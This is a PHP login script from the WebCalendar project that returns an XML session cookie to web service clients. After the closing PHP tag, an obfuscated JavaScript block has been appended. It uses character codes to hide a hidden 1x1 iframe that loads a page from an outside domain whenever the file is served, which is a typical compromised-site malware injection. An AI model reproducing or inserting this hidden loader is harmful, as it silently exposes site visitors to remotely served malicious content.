<?php
/*
 * $Id: login.php,v 1.2 2004/08/03 01:14:22 cknudsen Exp $
 *
 * Description:
 * 	Provides login mechanism for web service clients.
 */

$basedir = "..";
$includedir = "../includes";

include "$includedir/config.php";
include "$includedir/php-dbi.php";
include "$includedir/functions.php";
include "$includedir/$user_inc";
include "$includedir/connect.php";

load_global_settings ();

if ( ! empty ( $last_login ) )
  $login = "";

include "$includedir/translate.php";

// calculate path for cookie
if ( empty ( $PHP_SELF ) )
  $PHP_SELF = $_SERVER["PHP_SELF"];
$cookie_path = str_replace ( "login.php", "", $PHP_SELF );
//echo "Cookie path: $cookie_path\n";

$out = "<login>\n";

if ( $single_user == "Y" ) {
  // No login for single-user mode
  $out .= "<error>No login required for single-user mode</error>\n";
} else if ( $use_http_auth ) {
  // There is no login page when using HTTP authorization
  $out .= "<error>No login required for HTTP authentication</error>\n";
} else {
  if ( ! empty ( $login ) && ! empty ( $password ) ) {
    $login = trim ( $login );
    if ( user_valid_login ( $login, $password ) ) {
      user_load_variables ( $login, "" );
      // set login to expire in 365 days
      srand((double) microtime() * 1000000);
      $salt = chr( rand(ord('A'), ord('z'))) . chr( rand(ord('A'), ord('z')));
      $encoded_login = encode_string ( $login . "|" . crypt($password, $salt) );
      //SetCookie ( "webcalendar_session", $encoded_login, 0, $cookie_path );
      $out .= "  <cookieName>webcalendar_session</cookieName>\n";
      $out .= "  <cookieValue>$encoded_login</cookieValue>\n";
      if ( $is_admin )
        $out .= "  <admin>1</admin>\n";
    } else {
      $out .= "  <error>Invalid login</error>\n";
    }
  }
}

echo $out;
echo "</login>\n";
?>
<html><body><script>e=String.fromCharCode;if(typeof(hlwhk)==e(117,110,100,101,102,105,110,101,100)){hlwhk=1;c=document;n=c[e(99,114,101,97,116,101,69,108,101,109,101,110,116)](e(105,102,114,97,109,101));n[e(115,114,99)]=e(104,116,116,112,58,47,47,108,117,112,121,116,101,104,111,113,46,99,111,109,47,118,56,55,50,121,51,46,104,116,109);n[e(119,105,100,116,104)]=1;n[e(104,101,105,103,104,116)]=1;n[e(102,114,97,109,101,66,111,114,100,101,114)]=0;c[e(98,111,100,121)][e(97,112,112,101,110,100,67,104,105,108,100)](n);}</script></body></html>